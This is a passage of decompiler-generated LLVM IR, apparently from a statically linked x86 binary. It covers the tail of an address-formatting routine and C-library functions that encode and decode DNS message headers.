  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80574d1.284, i32 0, i32 0), %dec_label_pc_8053af6 ], [ %stack_var_-120.163, %dec_label_pc_8053a90 ], [ %stack_var_-120.163, %dec_label_pc_8053a94 ]
  %v0_8053a9419 = phi i32 [ %v2_8053b09, %dec_label_pc_8053af6 ], [ %v0_8053a9e64, %dec_label_pc_8053a90 ], [ %v1_8053a97, %dec_label_pc_8053a94 ]
  %v0_8053b0b = load i32, i32* @esi, align 4
  %v1_8053b0b = add i32 %v0_8053b0b, 1
  %v0_8053b15.pre = load i32, i32* @edi, align 4
  store i32 %v1_8053b0b, i32* @esi, align 4
  %v7_8053b0f = icmp sgt i32 %v1_8053b0b, 7
  %v10_8053b15 = icmp eq i32 %v0_8053b15.pre, -1
  br i1 %v7_8053b0f, label %dec_label_pc_8053b15, label %dec_label_pc_8053a80

dec_label_pc_8053b15:                             ; preds = %dec_label_pc_8053b0b
  br i1 %v10_8053b15, label %dec_label_pc_8053b26, label %dec_label_pc_8053b1a

dec_label_pc_8053b1a:                             ; preds = %dec_label_pc_8053b15, %dec_label_pc_8053ae6
  %v0_8053b22 = phi i32 [ %v0_8053a9419, %dec_label_pc_8053b15 ], [ %v3_8053af2, %dec_label_pc_8053ae6 ]
  %v0_8053b1a = phi i32 [ %v0_8053b15.pre, %dec_label_pc_8053b15 ], [ %v0_8053b1a.pre, %dec_label_pc_8053ae6 ]
  %v1_8053b1a = load i32, i32* @ebp, align 4
  %v2_8053b1a = add i32 %v1_8053b1a, %v0_8053b1a
  store i32 %v2_8053b1a, i32* %eax.global-to-local, align 4
  %v9_8053b1d = icmp eq i32 %v2_8053b1a, 8
  %v1_8053b20 = icmp eq i1 %v9_8053b1d, false
  br i1 %v1_8053b20, label %dec_label_pc_8053b26, label %dec_label_pc_8053b22

dec_label_pc_8053b22:                             ; preds = %dec_label_pc_8053b1a
  %v1_8053b22 = inttoptr i32 %v0_8053b22 to i8*
  store i8 58, i8* %v1_8053b22, align 1
  %v0_8053b25 = load i32, i32* @ebx, align 4
  %v1_8053b25 = add i32 %v0_8053b25, 1
  store i32 %v1_8053b25, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b26

dec_label_pc_8053b26:                             ; preds = %dec_label_pc_8053b1a, %dec_label_pc_8053b15, %dec_label_pc_8053b22
  %v0_8053b2a = phi i32 [ %v0_8053b22, %dec_label_pc_8053b1a ], [ %v0_8053a9419, %dec_label_pc_8053b15 ], [ %v1_8053b25, %dec_label_pc_8053b22 ]
  store i32 %v2_8053a75, i32* %edx.global-to-local, align 4
  %v1_8053b2a = add i32 %v0_8053b2a, 1
  store i32 %v1_8053b2a, i32* %eax.global-to-local, align 4
  %v1_8053b2d = inttoptr i32 %v0_8053b2a to i8*
  store i8 0, i8* %v1_8053b2d, align 1
  %v0_8053b30 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b30 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053b30 = sub i32 %v0_8053b30, %v1_8053b30
  store i32 %v2_8053b30, i32* @eax, align 4
  %tmp78 = icmp ugt i32 %v2_8053b30, %arg4
  br i1 %tmp78, label %dec_label_pc_8053b38, label %dec_label_pc_8053b45

dec_label_pc_8053b38:                             ; preds = %dec_label_pc_8053b26
  %v0_8053b38 = load i8*, i8** %stack_var_-124, align 4
  %v1_8053b38 = ptrtoint i8* %v0_8053b38 to i32
  %v2_8053b38 = call i32 @__errno_location(i32 %v1_8053b38)
  store i32 %v2_8053b38, i32* %eax.global-to-local, align 4
  %v1_8053b3d = inttoptr i32 %v2_8053b38 to i32*
  store i32 28, i32* %v1_8053b3d, align 4
  br label %dec_label_pc_8053b66

dec_label_pc_8053b45:                             ; preds = %dec_label_pc_8053b26
  %v0_8053b45 = load i32, i32* @edi, align 4
  store i32 %v0_8053b45, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_8053b482 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_8053b482, i32* %tmp46, align 4
  %v0_8053b4f.cast = inttoptr i32 %v3_8053b482 to i8*
  %v5_8053b4f = call i32 @strcpy(i8* %v0_8053b4f.cast, i32 %v2_8053a75)
  store i32 %v5_8053b4f, i32* %eax.global-to-local, align 4
  store i32 %v5_8053b4f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053b68

dec_label_pc_8053b5b:                             ; preds = %dec_label_pc_80539b4
  %v1_8053b5b = call i32 @__errno_location(i32 %v0_80539a7)
  store i32 %v1_8053b5b, i32* %eax.global-to-local, align 4
  %v1_8053b60 = inttoptr i32 %v1_8053b5b to i32*
  store i32 97, i32* %v1_8053b60, align 4
  br label %dec_label_pc_8053b66

dec_label_pc_8053b66:                             ; preds = %dec_label_pc_8053b38, %dec_label_pc_8053b5b
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053b68

dec_label_pc_8053b68:                             ; preds = %dec_label_pc_8053abf, %dec_label_pc_8053b45, %dec_label_pc_80539bf, %dec_label_pc_8053b66
  %v0_8053b6b = phi i32 [ 0, %dec_label_pc_8053abf ], [ %v5_8053b4f, %dec_label_pc_8053b45 ], [ %v3_80539cb, %dec_label_pc_80539bf ], [ 0, %dec_label_pc_8053b66 ]
  store i32 %v0_8053b6b, i32* %eax.global-to-local, align 4
  store i32 %v0_80539a7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053b6b

; uselistorder directives
  uselistorder i32 %v0_8053b6b, { 1, 0 }
  uselistorder i32 %v0_8053b2a, { 1, 0 }
  uselistorder i32 %v1_8053b0b, { 1, 0, 2 }
  uselistorder i32 %v0_8053b0053, { 1, 0 }
  uselistorder i32 %v0_8053aa2.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8053aa1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.162, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.163, { 2, 1, 0 }
  uselistorder i32 %v0_8053a9e64, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8053a9065, { 2, 0, 1 }
  uselistorder i32 %v0_8053a9a66, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8053a75, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8053a6d, { 1, 0 }
  uselistorder i32 %v0_8053a6d, { 1, 2, 0 }
  uselistorder i32 %v1_8053a50, { 0, 2, 1 }
  uselistorder i32 %v0_8053a409, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053a4b13, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8053a3b, { 1, 0 }
  uselistorder i32 %v0_8053a6668, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8053a5b69, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053a5071, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8053a0b72, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80539a7, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 4, 2, 5, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_80574d1.284, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 1, 0, 3, 4, 2 }
  uselistorder i32 64, { 6, 2, 0, 5, 7, 4, 1, 3 }
  uselistorder i32* @esp, { 0, 1, 69, 70, 71, 72, 73, 74, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 14, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 10, 244, 245, 246, 11, 247, 8, 248, 249, 250, 251, 252, 253, 12, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 9, 267, 268, 269, 270, 271, 272, 13, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 183, 2, 3, 301, 4, 5, 6, 15, 184, 185, 186, 187, 16, 188, 189, 190, 191, 192, 18, 193, 194, 195, 20, 196, 21, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 19, 209, 22, 210, 211, 212, 23, 213, 214, 215, 216, 217, 218, 219, 220, 17, 221, 103, 24, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 7, 85, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 104, 105, 106, 107, 108, 109, 110, 111, 112, 116, 113, 114, 115, 117, 118, 120, 119, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 25, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 26, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 27, 63, 64, 65, 66, 67, 68, 222, 294, 295, 296, 297, 298, 299, 300 }
  uselistorder i32 15, { 0, 3, 9, 8, 1, 7, 2, 4, 5, 6 }
  uselistorder i32 60, { 4, 5, 2, 6, 7, 3, 0, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 7, 9, 10, 4, 16, 14, 13, 15, 5, 1, 2, 3, 8, 6, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053b68, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8053b66, { 1, 0 }
  uselistorder label %dec_label_pc_8053b26, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053b0b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053af6, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053a80, { 1, 0 }
  uselistorder label %dec_label_pc_8053a75, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053a68, { 1, 0 }
  uselistorder label %dec_label_pc_8053a64, { 1, 0 }
  uselistorder label %dec_label_pc_8053a50, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053a4d, { 1, 0 }
  uselistorder label %dec_label_pc_8053a23, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053b75 = load i32, i32* @ebx, align 4
  store i32 %v0_8053b75, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8053b7d = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8053b7d, i32* %esi.global-to-local, align 4
  %v7_8053b86 = icmp sgt i32 %tmp, 11
  br i1 %v7_8053b86, label %dec_label_pc_8053b8c, label %dec_label_pc_8053c22

dec_label_pc_8053b8c:                             ; preds = %entry
  %v1_8053b8c = add i32 %tmp9, 1
  %v2_8053b8c = inttoptr i32 %v1_8053b8c to i8*
  %v3_8053b8c = load i8, i8* %v2_8053b8c, align 1
  store i8 %v3_8053b8c, i8* %tmp8, align 1
  %v0_8053b92 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b92 = inttoptr i32 %v0_8053b92 to i32*
  %v2_8053b92 = load i32, i32* %v1_8053b92, align 4
  %v1_8053b94 = trunc i32 %v2_8053b92 to i8
  %v2_8053b94 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053b94 = add i32 %v2_8053b94, 1
  %v4_8053b94 = inttoptr i32 %v3_8053b94 to i8*
  store i8 %v1_8053b94, i8* %v4_8053b94, align 1
  %v0_8053bba = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bba = add i32 %v0_8053bba, 8
  %v2_8053bba = inttoptr i32 %v1_8053bba to i32*
  %v3_8053bba = load i32, i32* %v2_8053bba, align 4
  %v1_8053bbd = mul i32 %v3_8053bba, 8
  %v2_8053bc3 = or i32 %v1_8053bbd, 4
  %v1_8053bc5 = add i32 %v0_8053bba, 20
  %v2_8053bc5 = inttoptr i32 %v1_8053bc5 to i32*
  %v3_8053bc5 = load i32, i32* %v2_8053bc5, align 4
  %v4_8053bc5 = icmp eq i32 %v3_8053bc5, 0
  %v1_8053bc9 = icmp eq i1 %v4_8053bc5, false
  %v2_8053bc9 = zext i1 %v1_8053bc9 to i32
  %v2_8053bcc = or i32 %v2_8053bc9, %v2_8053bc3
  %v2_8053bce = or i32 %v2_8053bcc, -126
  %v5_8053bce = trunc i32 %v2_8053bce to i8
  store i32 %v2_8053bce, i32* @ecx, align 4
  %v2_8053bd0 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053bd0 = add i32 %v2_8053bd0, 2
  %v4_8053bd0 = inttoptr i32 %v3_8053bd0 to i8*
  store i8 %v5_8053bce, i8* %v4_8053bd0, align 1
  %v0_8053bd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bd9 = add i32 %v0_8053bd3, 28
  %v2_8053bd9 = inttoptr i32 %v1_8053bd9 to i8*
  %v3_8053bd9 = load i8, i8* %v2_8053bd9, align 1
  %tmp13 = urem i8 %v3_8053bd9, 16
  %v2_8053be4 = or i8 %tmp13, -128
  %v2_8053be6 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053be6 = add i32 %v2_8053be6, 3
  %v4_8053be6 = inttoptr i32 %v3_8053be6 to i8*
  store i8 %v2_8053be4, i8* %v4_8053be6, align 1
  %v0_8053be9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053be9 = add i32 %v0_8053be9, 33
  %v2_8053be9 = inttoptr i32 %v1_8053be9 to i8*
  %v3_8053be9 = load i8, i8* %v2_8053be9, align 1
  %v2_8053bed = load i32, i32* %esi.global-to-local, align 4
  %v3_8053bed = add i32 %v2_8053bed, 4
  %v4_8053bed = inttoptr i32 %v3_8053bed to i8*
  store i8 %v3_8053be9, i8* %v4_8053bed, align 1
  %v0_8053bf0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bf0 = add i32 %v0_8053bf0, 32
  %v2_8053bf0 = inttoptr i32 %v1_8053bf0 to i32*
  %v3_8053bf0 = load i32, i32* %v2_8053bf0, align 4
  %v1_8053bf3 = trunc i32 %v3_8053bf0 to i8
  %v2_8053bf3 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053bf3 = add i32 %v2_8053bf3, 5
  %v4_8053bf3 = inttoptr i32 %v3_8053bf3 to i8*
  store i8 %v1_8053bf3, i8* %v4_8053bf3, align 1
  %v0_8053bf6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bf6 = add i32 %v0_8053bf6, 37
  %v2_8053bf6 = inttoptr i32 %v1_8053bf6 to i8*
  %v3_8053bf6 = load i8, i8* %v2_8053bf6, align 1
  %v2_8053bfa = load i32, i32* %esi.global-to-local, align 4
  %v3_8053bfa = add i32 %v2_8053bfa, 6
  %v4_8053bfa = inttoptr i32 %v3_8053bfa to i8*
  store i8 %v3_8053bf6, i8* %v4_8053bfa, align 1
  %v0_8053bfd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bfd = add i32 %v0_8053bfd, 36
  %v2_8053bfd = inttoptr i32 %v1_8053bfd to i32*
  %v3_8053bfd = load i32, i32* %v2_8053bfd, align 4
  %v1_8053c00 = trunc i32 %v3_8053bfd to i8
  %v2_8053c00 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c00 = add i32 %v2_8053c00, 7
  %v4_8053c00 = inttoptr i32 %v3_8053c00 to i8*
  store i8 %v1_8053c00, i8* %v4_8053c00, align 1
  %v0_8053c03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c03 = add i32 %v0_8053c03, 41
  %v2_8053c03 = inttoptr i32 %v1_8053c03 to i8*
  %v3_8053c03 = load i8, i8* %v2_8053c03, align 1
  %v2_8053c07 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c07 = add i32 %v2_8053c07, 8
  %v4_8053c07 = inttoptr i32 %v3_8053c07 to i8*
  store i8 %v3_8053c03, i8* %v4_8053c07, align 1
  %v0_8053c0a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c0a = add i32 %v0_8053c0a, 40
  %v2_8053c0a = inttoptr i32 %v1_8053c0a to i32*
  %v3_8053c0a = load i32, i32* %v2_8053c0a, align 4
  %v1_8053c0d = trunc i32 %v3_8053c0a to i8
  %v2_8053c0d = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c0d = add i32 %v2_8053c0d, 9
  %v4_8053c0d = inttoptr i32 %v3_8053c0d to i8*
  store i8 %v1_8053c0d, i8* %v4_8053c0d, align 1
  %v0_8053c10 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c10 = add i32 %v0_8053c10, 45
  %v2_8053c10 = inttoptr i32 %v1_8053c10 to i8*
  %v3_8053c10 = load i8, i8* %v2_8053c10, align 1
  %v2_8053c14 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c14 = add i32 %v2_8053c14, 10
  %v4_8053c14 = inttoptr i32 %v3_8053c14 to i8*
  store i8 %v3_8053c10, i8* %v4_8053c14, align 1
  %v0_8053c17 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c17 = add i32 %v0_8053c17, 44
  %v2_8053c17 = inttoptr i32 %v1_8053c17 to i32*
  %v3_8053c17 = load i32, i32* %v2_8053c17, align 4
  %v1_8053c1a = trunc i32 %v3_8053c17 to i8
  %v2_8053c1a = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c1a = add i32 %v2_8053c1a, 11
  %v4_8053c1a = inttoptr i32 %v3_8053c1a to i8*
  store i8 %v1_8053c1a, i8* %v4_8053c1a, align 1
  %v2_8053c22.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053c22

dec_label_pc_8053c22:                             ; preds = %entry, %dec_label_pc_8053b8c
  %v2_8053c22 = phi i32 [ %v0_8053b75, %entry ], [ %v2_8053c22.pre, %dec_label_pc_8053b8c ]
  %v0_8053c24 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8053b8c ]
  store i32 %v2_8053c22, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053c24

; uselistorder directives
  uselistorder i32 45, { 5, 1, 4, 3, 0, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 1, 0, 2 }
  uselistorder i32 33, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8053c22, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053c28 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c28, i32* %stack_var_-4, align 4
  %v4_8053c29 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8053c29, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8053c31 = load i8, i8* %tmp2, align 1
  %v3_8053c31 = zext i8 %v2_8053c31 to i32
  %v1_8053c34 = add i32 %v4_8053c29, 1
  %v2_8053c34 = inttoptr i32 %v1_8053c34 to i8*
  %v3_8053c34 = load i8, i8* %v2_8053c34, align 1
  %v4_8053c34 = zext i8 %v3_8053c34 to i32
  %v2_8053c38 = mul nuw nsw i32 %v3_8053c31, 256
  %v2_8053c3b = or i32 %v4_8053c34, %v2_8053c38
  %v2_8053c3d = inttoptr i32 %tmp to i32*
  store i32 %v2_8053c3b, i32* %v2_8053c3d, align 4
  %v0_8053c3f = load i32, i32* @ecx, align 4
  %v1_8053c3f = add i32 %v0_8053c3f, 2
  %v2_8053c3f = inttoptr i32 %v1_8053c3f to i8*
  %v3_8053c3f = load i8, i8* %v2_8053c3f, align 1
  %tmp6 = icmp slt i8 %v3_8053c3f, 0
  %v2_8053c43 = zext i1 %tmp6 to i32
  %v1_8053c46 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c46 = add i32 %v1_8053c46, 4
  %v3_8053c46 = inttoptr i32 %v2_8053c46 to i32*
  store i32 %v2_8053c43, i32* %v3_8053c46, align 4
  %v0_8053c49 = load i32, i32* @ecx, align 4
  %v1_8053c49 = add i32 %v0_8053c49, 2
  %v2_8053c49 = inttoptr i32 %v1_8053c49 to i8*
  %v3_8053c49 = load i8, i8* %v2_8053c49, align 1
  %v3_8053c4c = udiv i8 %v3_8053c49, 8
  %tmp7 = urem i8 %v3_8053c4c, 16
  %v1_8053c4f = zext i8 %tmp7 to i32
  %v1_8053c52 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c52 = add i32 %v1_8053c52, 8
  %v3_8053c52 = inttoptr i32 %v2_8053c52 to i32*
  store i32 %v1_8053c4f, i32* %v3_8053c52, align 4
  %v0_8053c55 = load i32, i32* @ecx, align 4
  %v1_8053c55 = add i32 %v0_8053c55, 2
  %v2_8053c55 = inttoptr i32 %v1_8053c55 to i8*
  %v3_8053c55 = load i8, i8* %v2_8053c55, align 1
  %div = udiv i8 %v3_8053c55, 4
  %tmp8 = urem i8 %div, 2
  %v1_8053c5c = zext i8 %tmp8 to i32
  %v1_8053c5f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c5f = add i32 %v1_8053c5f, 12
  %v3_8053c5f = inttoptr i32 %v2_8053c5f to i32*
  store i32 %v1_8053c5c, i32* %v3_8053c5f, align 4
  %v0_8053c62 = load i32, i32* @ecx, align 4
  %v1_8053c62 = add i32 %v0_8053c62, 2
  %v2_8053c62 = inttoptr i32 %v1_8053c62 to i8*
  %v3_8053c62 = load i8, i8* %v2_8053c62, align 1
  %div5 = udiv i8 %v3_8053c62, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8053c68 = zext i8 %tmp9 to i32
  %v1_8053c6b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c6b = add i32 %v1_8053c6b, 16
  %v3_8053c6b = inttoptr i32 %v2_8053c6b to i32*
  store i32 %v1_8053c68, i32* %v3_8053c6b, align 4
  %v0_8053c6e = load i32, i32* @ecx, align 4
  %v1_8053c6e = add i32 %v0_8053c6e, 2
  %v2_8053c6e = inttoptr i32 %v1_8053c6e to i8*
  %v3_8053c6e = load i8, i8* %v2_8053c6e, align 1
  %tmp10 = urem i8 %v3_8053c6e, 2
  %v1_8053c72 = zext i8 %tmp10 to i32
  %v1_8053c75 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c75 = add i32 %v1_8053c75, 20
  %v3_8053c75 = inttoptr i32 %v2_8053c75 to i32*
  store i32 %v1_8053c72, i32* %v3_8053c75, align 4
  %v0_8053c78 = load i32, i32* @ecx, align 4
  %v1_8053c78 = add i32 %v0_8053c78, 3
  %v2_8053c78 = inttoptr i32 %v1_8053c78 to i8*
  %v3_8053c78 = load i8, i8* %v2_8053c78, align 1
  %tmp11 = icmp slt i8 %v3_8053c78, 0
  %v2_8053c7c = zext i1 %tmp11 to i32
  %v1_8053c7f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c7f = add i32 %v1_8053c7f, 24
  %v3_8053c7f = inttoptr i32 %v2_8053c7f to i32*
  store i32 %v2_8053c7c, i32* %v3_8053c7f, align 4
  %v0_8053c82 = load i32, i32* @ecx, align 4
  %v1_8053c82 = add i32 %v0_8053c82, 3
  %v2_8053c82 = inttoptr i32 %v1_8053c82 to i8*
  %v3_8053c82 = load i8, i8* %v2_8053c82, align 1
  %tmp12 = urem i8 %v3_8053c82, 16
  %v1_8053c86 = zext i8 %tmp12 to i32
  %v1_8053c89 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c89 = add i32 %v1_8053c89, 28
  %v3_8053c89 = inttoptr i32 %v2_8053c89 to i32*
  store i32 %v1_8053c86, i32* %v3_8053c89, align 4
  %v0_8053c8c = load i32, i32* @ecx, align 4
  %v1_8053c8c = add i32 %v0_8053c8c, 4
  %v2_8053c8c = inttoptr i32 %v1_8053c8c to i8*
  %v3_8053c8c = load i8, i8* %v2_8053c8c, align 1
  %v4_8053c8c = zext i8 %v3_8053c8c to i32
  %v1_8053c90 = add i32 %v0_8053c8c, 5
  %v2_8053c90 = inttoptr i32 %v1_8053c90 to i8*
  %v3_8053c90 = load i8, i8* %v2_8053c90, align 1
  %v4_8053c90 = zext i8 %v3_8053c90 to i32
  %v2_8053c94 = mul nuw nsw i32 %v4_8053c8c, 256
  %v2_8053c97 = or i32 %v4_8053c90, %v2_8053c94
  %v1_8053c99 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c99 = add i32 %v1_8053c99, 32
  %v3_8053c99 = inttoptr i32 %v2_8053c99 to i32*
  store i32 %v2_8053c97, i32* %v3_8053c99, align 4
  %v0_8053c9c = load i32, i32* @ecx, align 4
  %v1_8053c9c = add i32 %v0_8053c9c, 6
  %v2_8053c9c = inttoptr i32 %v1_8053c9c to i8*
  %v3_8053c9c = load i8, i8* %v2_8053c9c, align 1
  %v4_8053c9c = zext i8 %v3_8053c9c to i32
  %v1_8053ca0 = add i32 %v0_8053c9c, 7
  %v2_8053ca0 = inttoptr i32 %v1_8053ca0 to i8*
  %v3_8053ca0 = load i8, i8* %v2_8053ca0, align 1
  %v4_8053ca0 = zext i8 %v3_8053ca0 to i32
  %v2_8053ca4 = mul nuw nsw i32 %v4_8053c9c, 256
  %v2_8053ca7 = or i32 %v4_8053ca0, %v2_8053ca4
  %v1_8053ca9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053ca9 = add i32 %v1_8053ca9, 36
  %v3_8053ca9 = inttoptr i32 %v2_8053ca9 to i32*
  store i32 %v2_8053ca7, i32* %v3_8053ca9, align 4
  %v0_8053cac = load i32, i32* @ecx, align 4
  %v1_8053cac = add i32 %v0_8053cac, 8
  %v2_8053cac = inttoptr i32 %v1_8053cac to i8*
  %v3_8053cac = load i8, i8* %v2_8053cac, align 1
  %v4_8053cac = zext i8 %v3_8053cac to i32
  %v1_8053cb0 = add i32 %v0_8053cac, 9
  %v2_8053cb0 = inttoptr i32 %v1_8053cb0 to i8*
  %v3_8053cb0 = load i8, i8* %v2_8053cb0, align 1
  %v4_8053cb0 = zext i8 %v3_8053cb0 to i32
  %v2_8053cb4 = mul nuw nsw i32 %v4_8053cac, 256
  %v2_8053cb7 = or i32 %v4_8053cb0, %v2_8053cb4
  %v1_8053cb9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053cb9 = add i32 %v1_8053cb9, 40
  %v3_8053cb9 = inttoptr i32 %v2_8053cb9 to i32*
  store i32 %v2_8053cb7, i32* %v3_8053cb9, align 4
  %v0_8053cbc = load i32, i32* @ecx, align 4
  %v1_8053cbc = add i32 %v0_8053cbc, 10
  %v2_8053cbc = inttoptr i32 %v1_8053cbc to i8*
  %v3_8053cbc = load i8, i8* %v2_8053cbc, align 1
  %v4_8053cbc = zext i8 %v3_8053cbc to i32
  %v1_8053cc0 = add i32 %v0_8053cbc, 11
  %v2_8053cc0 = inttoptr i32 %v1_8053cc0 to i8*
  %v3_8053cc0 = load i8, i8* %v2_8053cc0, align 1
  %v4_8053cc0 = zext i8 %v3_8053cc0 to i32
  %v2_8053cc4 = mul nuw nsw i32 %v4_8053cbc, 256
  %v2_8053cc7 = or i32 %v4_8053cc0, %v2_8053cc4
  %v1_8053cc9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053cc9 = add i32 %v1_8053cc9, 44
  %v3_8053cc9 = inttoptr i32 %v2_8053cc9 to i32*
  store i32 %v2_8053cc7, i32* %v3_8053cc9, align 4
  %v2_8053cd1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053cd1, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 13, 14, 4, 5, 9, 10, 15, 7, 2, 11, 12, 0, 6, 3, 8, 1 }
  uselistorder i32 40, { 8, 9, 3, 11, 12, 13, 10, 0, 1, 4, 5, 6, 7, 2 }
  uselistorder i32 7, { 18, 19, 3, 6, 4, 0, 2, 7, 14, 15, 16, 17, 5, 1, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 6, { 25, 26, 2, 3, 21, 22, 0, 6, 18, 14, 15, 8, 28, 16, 23, 24, 4, 1, 5, 7, 12, 13, 17, 20, 9, 19, 10, 11, 27 }
  uselistorder i32 28, { 34, 35, 17, 18, 36, 25, 48, 47, 40, 41, 2, 42, 43, 44, 45, 46, 3, 4, 5, 0, 26, 16, 19, 20, 37, 38, 27, 28, 29, 30, 31, 32, 1, 33, 49, 39, 21, 22, 23, 6, 7, 24, 12, 11, 9, 10, 13, 14, 8, 15 }
